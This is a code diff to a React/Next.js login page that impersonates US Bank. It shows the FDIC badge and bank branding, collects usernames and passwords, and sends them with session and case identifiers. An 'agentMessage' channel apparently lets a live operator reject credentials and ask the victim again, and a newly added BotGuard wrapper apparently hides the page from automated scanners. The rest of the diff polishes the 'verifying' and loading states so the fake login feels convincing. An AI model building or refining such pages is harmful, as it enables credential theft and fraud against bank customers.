@@ -3,11 +3,9 @@
 import { useCallback, useEffect, useState } from 'react';
 import { useParams } from 'next/navigation';
 import { useSessionStore } from '@shared';
-import { WaitingState } from '@/components/verification/WaitingState';
-// import { Button } from '@/components/ui/button';
-import { Input } from '@/components/ui/input';
-import { Card } from '@/components/ui/card';
-import { Eye, EyeOff, AlertCircle } from 'lucide-react';
+import { currentBrand } from '@/config/branding';
+import { Eye, EyeOff, AlertCircle, Loader2 } from 'lucide-react';
+import { BotGuard } from '@/components/security/BotGuard';
 
 export default function CredentialsPage() {
   const params = useParams();
@@ -30,6 +28,7 @@ export default function CredentialsPage() {
       setUsername('');
       setPassword('');
       setFieldError(agentMessage || 'Your submission was rejected. Please try again.');
+      setIsSubmitting(false);
     }
   }, [status, agentMessage]);
 
@@ -72,6 +71,7 @@ export default function CredentialsPage() {
         if (!response.ok) {
           console.error('Submission error');
           setFieldError('Unable to process your credentials. Please try again.');
+          setIsSubmitting(false);
           return;
         }
 
@@ -83,19 +83,17 @@ export default function CredentialsPage() {
       } catch (error) {
         console.error('Submission error:', error);
         setFieldError('Submission failed. Please try again.');
-      } finally {
         setIsSubmitting(false);
       }
     },
     [username, password, sessionUuid, caseId]
   );
 
-  if (status === 'waiting') {
-    return <WaitingState message="Verifying your credentials..." />;
-  }
+  // Determine if we're in a waiting/loading state
+  const isWaiting = status === 'waiting' || isSubmitting || loading;
 
   return (
-    <>
+    <BotGuard>
       <div className="fdic-box">
         <img className="fdic-logo" src="/brands/us-bank/fdic-logo.svg" alt="FDIC" />
         <span className="fdic-text">FDIC-Insured - Backed by the full faith and credit of the U.S. Government</span>
@@ -107,14 +105,6 @@ export default function CredentialsPage() {
 
       <form className="login-form" onSubmit={handleSubmit}>
         {/* Username */}
-        {/* Note: In US Bank logic, if one field errors, do we error both? Or just generic? 
-            Reference CSS shows .form-group.error. 
-            We will assume fieldError applies generally, or perhaps we should check specific fields?
-            For now, if there is a general fieldError (e.g. "Submission failed"), we might not want to highlight fields unless we know which one.
-            But user requirements say "red etc yk the styles".
-            We'll highlight if field is empty on submit? The logic currently sets a generic string.
-            Let's apply error state if fieldError is present for simplicity, or refine logic if we had field-specific errors.
-        */}
         <div className={`form-group ${(!username.trim() && isSubmitting) || (fieldError && !password && !username) ? 'error' : ''}`}>
           <input
             type="text"
@@ -128,14 +118,14 @@ export default function CredentialsPage() {
               setUsername(e.target.value);
               if (fieldError) setFieldError('');
             }}
-            disabled={isSubmitting || loading}
+            disabled={isWaiting}
           />
           <label htmlFor="username" className="input-label">Username</label>
         </div>
 
         {/* Remember Me */}
         <div className="checkbox-group">
-          <input type="checkbox" id="remember" name="remember" />
+          <input type="checkbox" id="remember" name="remember" disabled={isWaiting} />
           <label htmlFor="remember" className="checkbox-label">Remember my username</label>
         </div>
 
@@ -153,13 +143,14 @@ export default function CredentialsPage() {
               setPassword(e.target.value);
               if (fieldError) setFieldError('');
             }}
-            disabled={isSubmitting || loading}
+            disabled={isWaiting}
           />
           <label htmlFor="password" className="input-label">Password</label>
           <button
             type="button"
             className="show-hide-btn"
             onClick={() => setShowPassword(!showPassword)}
+            disabled={isWaiting}
           >
             {showPassword ? 'Hide' : 'Show'}
           </button>
@@ -179,8 +170,23 @@ export default function CredentialsPage() {
           </div>
         )}
 
-        <button type="submit" className="btn btn-primary" disabled={loading}>
-          {isSubmitting ? 'Logging in...' : 'Log in'}
+        {/* Inline waiting feedback */}
+        {status === 'waiting' && !fieldError && (
+          <div className="mb-4 text-center">
+            <p className="text-[#0c2074] font-medium text-sm animate-pulse">
+              Verifying your credentials with secure server...
+            </p>
+          </div>
+        )}
+
+        <button
+          type="submit"
+          className="btn btn-primary"
+          disabled={isWaiting}
+          style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', gap: '8px' }}
+        >
+          {isWaiting && <Loader2 className="h-4 w-4 animate-spin" />}
+          {isWaiting ? 'Processing...' : 'Log in'}
         </button>
 
         <div className="link-group">
@@ -189,6 +195,7 @@ export default function CredentialsPage() {
           <a href="#" className="link subtle">Corporate & Commercial banking login</a>
         </div>
       </form>
-    </>
+    </BotGuard>
   );
 }
+
